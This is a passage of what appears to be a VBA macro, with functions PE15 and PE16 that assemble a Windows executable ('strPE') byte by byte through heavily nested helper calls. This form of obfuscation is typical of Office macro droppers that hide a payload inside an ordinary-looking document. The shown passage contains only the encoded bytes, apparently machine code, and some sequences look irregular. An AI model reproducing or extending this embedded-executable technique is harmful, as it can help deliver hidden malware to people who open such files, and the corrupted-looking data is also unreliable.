    strPE = A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(strPE, "]"), 194), 20), 0), "x"), 199), 1), "t"), 5), 191), 0), 180), 0), 4), 159), 195), 0), 8), 9), 250), "t"), 6), 129), 207), 0), 0), " "), 0), 246), 195), 3), 22), 34), 247), 195), 0), 0), 16), 0), "t"), 205), 162), 249), 235), "|"), 6), 129), 207), 0), 0)
    strPE = A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(strPE, 0), 226), 247), 195), 0), 0), "A"), 0), "t"), 7), 129), "M"), 252), 1), 0), 2), 0), 246), 199), "/t"), 6), 129), 207), "k"), 0), 202), "@"), 131), "?"), 20), "|I"), 246), 199), 156), "t"), 9), 128), 139), 2), 174), 207), 0), 0), 0), "H"), 139), "E"), 12)
    strPE = A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(strPE, 141), 141), 248), 191), 255), 255), "Ph"), 0), " "), 0), 0), "Q"), 199), 246), 253), 25), 255), 131), 196), "F"), 218), 192), 15), 138), 145), 1), 0), 0), 139), "U"), 248), "P"), 139), ">"), 181), "pE"), 252), 18), 203), 141), 248), 191), 226), 255), "PQS"), 21)
    strPE = A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(strPE, 176), 192), "@"), 0), 235), 27), 139), "V"), 248), 139), "E"), 252), 139), 180), 178), 142), 0), "WV"), 149), 232), "R.Q"), 255), 21), 172), 192), "@"), 0), 128), 231), 239), 131), 248), 255), 136), "E"), 16), "u "), 139), 218), 152), 192), "@"), 0), "q"), 214), 133)
    strPE = A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(strPE, "U"), 15), 132), "A"), 1), 0), 0), 255), 214), "_"), 162), 5), 128), 252), 10), 0), "["), 139), 229), "]"), 182), 20), 0), 139), 188), 24), "j"), 13), "R"), 232), 212), 180), 255), 255), 139), "_"), 8), 139), 225), "3"), 192), 139), 215), 183), 24), 153), 0), 0), 243), 171)
    strPE = A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(strPE, 139), "("), 24), 139), "M"), 16), 137), 22), 137), ":.U"), 12), ","), 6), "RW"), 137), "H#"), 232), 155), 194), 255), 255), 139), 23), 164), "A "), 139), 22), 131), 200), 255), 137), "Z"), 24), 139), 14), 246), 195), 8), 137), "A"), 16), "'A"), 20), 139)
    strPE = B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(strPE, 22), 137), "B0t"), 177), "/"), 6), "j"), 130), "],"), 139), 234), 199), "@4"), 1), 0), 0), 135), 139), 14), 139), "Q"), 4), "R"), 255), 21), 168), 192), "@"), 0), 132), 28), "y"), 31), 134), 236), "h"), 0), 16), 0), "j&"), 198), "@0"), 1), "G")
    strPE = A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(strPE, "\"), 180), 250), "N"), 139), 14), 137), "A8"), 139), 22), 199), "B"), 205), 0), 16), 0), "B"), 139), 6), 149), "M,"), 132), 160), 11), 7), 235), "H4"), 133), 201), "t<W"), 131), 192), "Xj"), 0), "P"), 232), 178), "_"), 0), 0), 215), 192), 137), 235)
    strPE = A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 12), "t)"), 139), 6), 223), 232), 3), 253), 255), 255), 131), 235), 4), 133), 192), "u"), 14), 23), 14), "h1"), 147), "@"), 136), "QW"), 232), 238), 191), 255), 255), 131), 170), 12), "_ e"), 139), 229), "]"), 194), 20), 0), 131), "="), 220), "NA"), 0)
    strPE = A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(B(strPE, "2|"), 234), "{"), 6), 139), "H"), 24), 132), 237), "y"), 13), "P"), 148), "J^"), 0), 0), 131), 196), 128), 19), 192), "t"), 11), 10), 243), 139), "H"), 24), "+"), 229), 127), 137), "H"), 24), "i"), 22), "t"), 0), "W"), 131), 194), "\j"), 1), "R"), 221), "x"), 130)
    strPE = A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(strPE, "`"), 198), 246), 199), 8), "p"), 21), 241), 31), "h W@"), 0), "h@"), 147), "@"), 163), "V"), 139), 6), "P"), 232), 130), 255), 255), 255), "3"), 192), "_^["), 139), 229), "]"), 194), 20), 0), 144), 144), 144), "U"), 139), 236), 131), 163), "8P"), 139)
    strPE = A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(strPE, "u"), 8), 141), "E"), 200), 199), "E"), 252), 0), 0), 0), 0), 139), "N"), 4), "PQ"), 255), 21), "v"), 192), "@"), 0), 133), 192), "t"), 15), 139), "E"), 200), 137), 196), 2), "t"), 7), "3N^"), 139), 229), "]"), 195), 139), 127), 12), 133), 192), "t"), 17), 199)
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(strPE, "@"), 8), 0), 244), 0), 0), 195), "V"), 230), 199), "B"), 12), 175), 0), 0), 0), "_"), 146), 12), 139), "V"), 4), "W"), 141), "M"), 217), "P"), 183), 196), 0), "j"), 0), "j"), 0), "j"), 0), "h"), 196), 0), 9), 0), 7), 175), 21), 172), 192), "'"), 0), 133), 231)
    strPE = A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(strPE, "A"), 8), "M3"), 192), "^"), 139), "O"), 235), 193), 139), "="), 152), 192), 153), 0), 255), 215), "%"), 192), "u"), 6), 203), "^C"), 21), "]"), 195), 255), 215), 5), 128), 252), 10), 0), "=e"), 222), 11), 0), 15), 133), 26), 0), 0), 0), 139), "="), 188), 192)
    strPE = B(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(B(strPE, "@"), 0), 234), 167), 20), 139), "F"), 16), 133), 201), "|"), 22), 127), 4), "w"), 192), "v"), 16), "j"), 0), "hT"), 251), 0), 0), "QP"), 232), 18), 30), 0), 0), 235), 13), 25), "("), 131), 248), 255), "("), 4), 11), "_"), 222), 2), "3"), 192), "P"), 203), "~")
    strPE = A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(strPE, 12), 139), "H"), 16), "Q"), 255), 215), "="), 24), 0), ":"), 0), "t"), 194), 133), 192), "t1"), 161), 236), 5), "Nk"), 139), "~"), 4), 31), 192), "u"), 24), "Ph"), 220), 0), "A"), 210), 22), 232), 134), 17), 153), 152), 131), 173), 12), "."), 175), 5), "H"), 0)
    strPE = A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(strPE, 133), 192), "t"), 5), "W"), 255), 208), 4), 8), "t"), 1), 255), 21), "L"), 192), 240), 0), 139), "F"), 12), 139), "NI"), 141), "U"), 252), "j"), 1), "RPQ"), 255), 21), 180), 170), "@"), 0), 133), 192), 130), 8), "_"), 230), 192), "^"), 139), 229), 210), 195), 139)
    strPE = B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(strPE, 34), 152), 192), "@"), 0), 255), 170), 133), 192), "u"), 6), "!^"), 139), "G]"), 195), 255), 214), 5), 128), 252), 10), 0), "_"), 228), 139), 229), "]"), 217), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), "xU"), 240), 236), "V"), 139), "u")
    strPE = A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(strPE, 8), "V)"), 19), "tT."), 131), 196), 4), 133), 192), "u"), 29), 139), 6), 15), "7"), 147), "@"), 0), "VP"), 232), 143), 189), 255), 255), 139), "v="), 133), 246), 177), 6), 255), 232), "Q"), 11), 0), 189), "W"), 192), 159), "]"), 194), 4), 0), 144), 144)
    strPE = A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(strPE, 144), 144), 144), 144), 144), 182), 144), 144), "U"), 139), 236), "SV"), 142), "u"), 16), "W"), 153), "}"), 12), "3"), 142), 139), 238), 8), 141), "E"), 16), "P"), 6), "Q"), 137), "u"), 16), "}"), 222), 215), 0), 0), 249), "M"), 25), ";"), 249), "+"), 241), 3), 217), 133), 192)
    strPE = A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(B(strPE, "u"), 4), 246), 3), "w"), 236), 4), "M"), 20), 133), 181), "%#"), 23), "n_^[]"), 192), 16), 0), "U"), 139), 236), 246), 236), "<"), 161), 220), 8), "A"), 0), "S3"), 210), "V"), 131), 248), 30), "W"), 137), "X"), 248), 137), "U"), 244), 137), "U"), 240)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(strPE, "}"), 23), 139), "E"), 16), 139), "M"), 8), "P"), 221), 232), 5), 6), 149), 0), 131), 196), 8), "_^["), 139), "]]"), 195), 139), "M"), 16), 247), 193), 0), 0), 208), 0), "]"), 132), ","), 2), 0), 0), 139), 137), 3), 4), 129), 230), 8), 0), 17), 0)
    strPE = A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(strPE, 220), "]H"), 137), "`"), 236), "t"), 10), 199), "E"), 252), 1), 0), 0), 253), 139), "]"), 252), 139), 249), 129), 231), 0), 0), 34), 0), "t"), 6), 131), 203), 2), 137), "]"), 245), 129), 225), 0), 0), "p"), 0), 137), 227), 232), "t"), 6), 131), 203), 4), "@"), 221)

    PE15 = strPE
End Function

Private Function PE16() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(strPE, 252), 139), "E"), 237), 131), 248), 2), 15), 133), 225), 0), 0), 0), 217), "U"), 12), "j"), 4), "h"), 224), 0), 244), 0), "R3"), 219), "$c"), 157), 193), "d"), 0), 131), 196), 12), 133), 192), "--"), 139), "E"), 12), 187), 214), 9), 0), 0), "S"), 131), 192)
    strPE = B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(strPE, 8), "h"), 128), 1), "A"), 0), "P"), 255), 21), 4), 193), "@"), 11), 131), 196), 12), 184), 192), "u"), 14), 139), 176), 12), 187), 6), 0), 0), 0), "f"), 199), 219), 12), "\"), 157), 161), "L"), 6), "A"), 0), 133), 192), 200), 25), "P"), 193), "h"), 1), "A"), 173), "j")
    strPE = A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 1), 232), 182), 218), 0), 0), 131), 196), 12), 163), "L"), 6), "A"), 0), 133), 192), "t"), 178), 139), "M"), 232), 141), 217), 229), 247), 217), "Rq "), 240), "Z"), 201), "j"), 0), "#"), 202), 141), "U"), 248), 242), 223), "Q"), 141), "M"), 244), 178), 255), "#"), 249), 139)
    strPE = A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(strPE, "M"), 252), 247), 222), 27), 246), 219), "#"), 242), 139), "U"), 12), "VQ"), 141), 12), "Zh"), 1), 238), 197), 208), 235), 10), "j"), 1), 255), 21), "L"), 192), "@"), 0), "3"), 192), 207), 203), 6), 252), 9), 139), "U"), 12), 193), 199), 135), 12), 17), 0), "3"), 201)
    strPE = A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(strPE, ";"), 193), 22), 133), 177), 0), 0), 0), 139), "}"), 8), 139), "Uhu W"), 235), 0), "h`"), 156), 252), 0), 139), 7), "RP"), 24), 247), 187), 255), 255), 233), 179), 0), 0), 225), 131), 248), 1), "uW"), 161), "P"), 6), "A"), 0), "h"), 194)
    strPE = A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(strPE, "u"), 28), "R["), 127), 1), "A"), 0), "W"), 1), 232), 23), 15), 0), "Z"), 131), 196), 12), 163), "P"), 240), "A"), 0), 164), 192), "t_"), 219), "M"), 232), 141), "|"), 236), 247), 217), "`"), 141), "U"), 240), 27), 201), "j"), 0), "#"), 202), 141), "U"), 127), 247), 223)
    strPE = B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(B(strPE, "QvM"), 244), 27), 255), "#"), 249), 139), "M"), 12), 247), 222), "D"), 246), "W"), 173), 242), "VS"), 10), "gQ"), 255), 208), 233), "|("), 255), 255), ";"), 194), 210), 133), 146), 0), 0), 0), 161), "T9A"), 0), ";8u"), 189), "Rhr")
    strPE = A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(strPE, 1), "A"), 0), "j"), 180), 232), 184), 14), 0), 0), 131), 196), 12), 163), "T"), 6), "Aq"), 133), 192), "u"), 161), "j"), 1), "4"), 21), "L"), 192), "@"), 0), 20), "O"), 255), 255), 4), 139), "}"), 8), 137), "M"), 240), 137), 11), 244), 137), "M"), 248), "9M"), 232)
    strPE = A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(strPE, "ta"), 139), "U"), 16), "RW"), 232), 20), 4), 0), 25), 131), 196), 8), 235), "o"), 248), "E"), 248), "3"), 201), 19), 7), 208), 14), 137), 20), 16), 139), "G"), 4), 13), 0), 236), "2"), 0), 137), "G"), 4), 139), "E"), 244), ";"), 193), "t"), 14), 137), 8), 155)
    strPE = A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(strPE, 139), "G"), 224), 13), 0), 160), 133), 0), 137), "G"), 4), 139), 194), 240), 0), 193), "t"), 185), 139), "M"), 16), "PI"), 18), 232), 129), 1), 0), 0), 131), 196), 12), 235), 15), "_="), 184), 247), 17), "_"), 0), "["), 139), 168), "]"), 219), 230), 192), 8), 131)
    strPE = A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(strPE, "="), 162), 8), 177), 0), "2"), 15), 140), 27), 1), "["), 0), 139), "E@"), 187), 0), 228), "7"), 0), 133), 195), 15), 132), 11), 1), 0), 0), 206), 127), 12), 1), 15), 133), 1), 1), 0), 0), 221), "u)"), 139), "Nug"), 161), 240), 6), "A"), 0)
    strPE = A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(strPE, 133), 192), 194), 25), 190), "9("), 1), "A"), 0), "j"), 5), 232), 233), 13), 0), 0), 131), 145), 12), 163), "t"), 6), "A`"), 133), 192), "t;j"), 5), "BM"), 196), "G Q"), 148), "M"), 220), 141), "U"), 228), 166), "Q"), 255), 208), 133), 214), 15)
    strPE = A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 133), 190), 0), 0), 0), 133), "E"), 228), 133), 192), 15), 133), 179), 6), 0), 0), 139), "Er6UG"), 137), "G4"), 139), "G"), 4), 137), "W0"), 164), 195), 233), 154), 0), 0), 0), "X"), 1), 255), 21), "L"), 192), "@"), 0), "u"), 213), 139), 29)
    strPE = B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(B(strPE, "L"), 192), "@"), 0), "j"), 0), 255), 211), "-"), 254), 2), "u"), 28), 161), "`"), 6), "A"), 0), 244), 192), 24), "LPh"), 16), 1), "A"), 0), "PXt"), 13), 24), 0), 163), 253), 6), "A"), 0), 235), 31), "2"), 254), 1), "}7"), 161), "\"), 190), "A")
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(strPE, 0), 133), 192), "u"), 127), "P"), 210), 248), 249), "A"), 0), "P"), 232), "S"), 243), 0), 0), 163), "\"), 6), "A"), 0), "G#"), 12), 133), 192), 196), 14), 235), "U"), 12), 141), "M"), 8), "QR"), 255), 208), 139), 240), 235), 11), "j"), 134), 255), 211), 134), 246), 235)
    strPE = B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(strPE, 18), 139), "u"), 180), 5), 254), 255), "u"), 197), 255), 5), 152), 209), "@"), 0), 133), 192), "u"), 26), 172), "M"), 8), 210), 192), 16), 198), "3"), 210), 128), 200), "0"), 139), "G"), 4), 11), 202), 128), 204), 2), 137), "O4"), 137), "["), 4), 139), "G"), 4), 139), "u")
    strPE = A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(strPE, 16), 247), 208), "#"), 198), 191), 247), 216), 27), "#^\x"), 17), 1), 0), "["), 139), 229), "]"), 195), 144), 144), 144), 245), 144), 144), 144), 19), 144), 144), 144), "U"), 139), 236), 139), "E"), 8), "m"), 149), 23), 192), 192), "@"), 0), "3"), 192), 188), 195), 144)
    strPE = A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 144), 144), 144), 232), 165), 144), 144), 144), 144), 144), 144), 144), 144), 144), "O"), 206), 236), 131), 236), " S3"), 192), "VW"), 139), "}"), 12), 137), 14), 11), ",E"), 240), 197), 199), "3"), 219), "%"), 0), 0), "@"), 0), 137), "L"), 224), 137), "]"), 228), 7)
    strPE = A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(B(strPE, "]"), 153), 137), "E"), 252), "t"), 216), "9"), 29), 132), 6), "A"), 0), "uEh"), 132), 6), "A"), 0), "SS"), 27), "<SS"), 10), "S"), 141), "M"), 244), "jjQ"), 136), "]"), 244), 136), "]:"), 136), "]"), 246), 136), "]"), 247), 136), ";P"), 198)
    strPE = A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(strPE, "E"), 249), 1), 196), 21), 4), 192), "^"), 0), 205), "a"), 2), 15), "h"), 196), 158), "@("), 232), "?"), 24), "p"), 0), "+"), 196), 4), 235), 26), "`"), 29), 132), 6), 235), 0), 139), "u"), 194), 247), 199), 0), 0), 16), 0), "to"), 159), "F"), 4), 0), 0)
    strPE = A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(strPE, 21), 0), 240), "f#H"), 6), "\"), 0), 134), "V"), 16), 128), 195), 201), "E"), 236), 1), 0), 0), 0), 137), 178), 240), "u"), 29), "S-"), 140), 1), "A"), 0), "j"), 1), 232), 167), 189), "b"), 0), 131), 196), "a;"), 195), 242), "H"), 6), "A"), 0), 251)
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(strPE, 132), 135), 4), 0), 0), 141), 1), 210), 141), "U"), 224), "Q"), 216), "M"), 16), "RQ"), 0), 208), ";"), 222), "u!"), 162), "U"), 12), "j"), 8), "R"), 232), "4"), 24), 236), 0), "\N"), 8), 131), 196), 8), 11), 200), 13), "g"), 4), 13), 0), 0), 16), 0)
    strPE = B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 137), 173), 8), 137), 134), 133), 247), 199), 0), 0), "n"), 0), 15), 150), 191), 0), 0), 0), ">F["), 0), 0), 2), 0), "t*"), 155), "F"), 20), 199), "Ej"), 2), 0), 156), 0), 137), 10), 240), 161), "H"), 6), "A"), 0), ";lu"), 25), "S")
    strPE = A(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(strPE, "h"), 140), 1), "A"), 0), "j"), 225), 232), 150), 11), 15), 238), 131), 196), 172), ";"), 195), 163), 14), 6), "A"), 0), 136), 26), "U"), 130), 12), 141), "U"), 224), 244), 139), "M"), 16), "RQ"), 255), 208), "~"), 20), "j"), 187), 255), 21), "L"), 192), "@"), 221), 235), 129)
    strPE = A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(strPE, 146), 1), 255), 21), "L"), 192), "@"), 30), 235), 4), ";"), 195), "u!"), 139), "U"), 12), "j"), 4), "R"), 232), 183), 0), 0), 163), 139), "Na"), 131), 196), 8), 11), 241), "ZF"), 4), 13), 211), 0), " "), 0), 137), "D"), 8), 137), "F"), 4), "9]"), 187)
    strPE = B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(B(strPE, "tg"), 161), 132), 6), "A"), 0), "Y"), 195), "W^"), 137), "E"), 240), 161), "H"), 6), "A"), 0), ";"), 195), 199), "E"), 236), "/"), 0), 0), 0), "u"), 25), "S"), 135), 140), 1), "A"), 176), "j"), 203), "]"), 19), 11), 0), 0), 212), 196), 174), ";"), 195), 166), "H")
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(strPE, 6), "A"), 0), "t"), 181), 141), "M"), 12), 141), "U"), 224), "x"), 139), "M"), 175), "RQ"), 255), 208), ";"), 195), "u "), 139), "U"), 12), "S"), 139), 232), "K"), 0), 142), 0), 139), "N"), 8), 131), 196), 8), 11), 200), 139), "F"), 4), 13), 0), 0), 23), 0), 137)
    strPE = A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(strPE, 7), 8), 137), "F"), 4), "_w_"), 139), 229), "]"), 152), "j"), 1), 255), "Y"), 242), 192), "6"), 148), 235), 207), 144), 144), 144), 144), 144), 243), 6), "A"), 0), "8"), 192), "t"), 17), "P"), 255), 21), 0), 192), "@"), 0), 199), 5), 132), 6), "w"), 0), 0), 0)
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 0), 0), 195), 144), 144), 27), 144), 144), "U"), 198), 236), 138), "M"), 8), "3"), 192), 246), 193), " t"), 5), 184), 1), 0), 153), 0), 246), 193), ">t"), 1), 12), 2), 246), 193), 1), "t"), 2), 160), 4), 139), 185), 12), 211), 224), "]"), 195), 144), 144), 129)
    strPE = A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(strPE, 144), 144), 144), "."), 144), 144), "U"), 139), "-"), 139), "E"), 8), 146), "H"), 8), 247), 193), 0), 0), 250), 16), "t"), 5), 131), 201), 5), 156), 3), 131), 201), "d<"), 209), 137), 2), 8), 243), 185), 4), "("), 209), 193), 226), 4), 11), 209), 139), "H"), 4), 129)
    strPE = B(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(strPE, 187), 0), 0), "p"), 0), 137), "P"), 176), 137), "H"), 231), 139), 193), 139), "M"), 12), 247), "P#"), 193), 247), 216), 27), 192), "%x}"), 1), 0), "]"), 27), 144), 144), 144), 144), 144), "U"), 139), 236), 19), 139), "]"), 12), "V"), 139), "u"), 8), 178), "&A")
    strPE = A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(strPE, 0), 0), 0), "3X"), 27), "$f"), 171), 218), 145), 16), "3"), 210), 185), " "), 0), 0), 0), 137), 0), 12), 137), "F8"), 137), 14), "<"), 232), "!"), 25), 0), 0), 137), "F8"), 137), "V<"), 139), "K"), 12), 139), 208), 139), "F<3E"), 11)
    strPE = B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(strPE, 209), 11), 199), 137), "V8"), 137), "F<W"), 139), 208), 139), "F8j"), 10), "RP"), 232), 24), 22), 0), "z"), 19), "!<"), 139), 224), "<"), 139), 208), 137), "F8"), 129), 194), 0), 192), "y"), 183), 129), 209), "i"), 161), 214), 255), 137), "V8")
    strPE = A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(strPE, 137), 13), "<"), 144), "K"), 8), 137), "NH"), 139), 193), "@"), 215), 213), " "), 0), 0), 0), 137), "~"), 143), 2), 196), 24), 0), 0), 137), "FH"), 137), "?L"), 237), "S"), 4), 139), "Nw"), 11), 194), 11), 28), 137), "FH"), 137), "NL"), 189), 139)
    strPE = A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(strPE, 193), 139), "NHj~PQ"), 147), 191), 21), "y"), 0), 137), "FH"), 5), 0), 192), "y"), 183), 137), "VL"), 137), "FH"), 129), 210), "i"), 161), 214), "1"), 185), 229), 0), 0), 0), 137), "VL"), 139), "S~9V@"), 139), 194), 139)
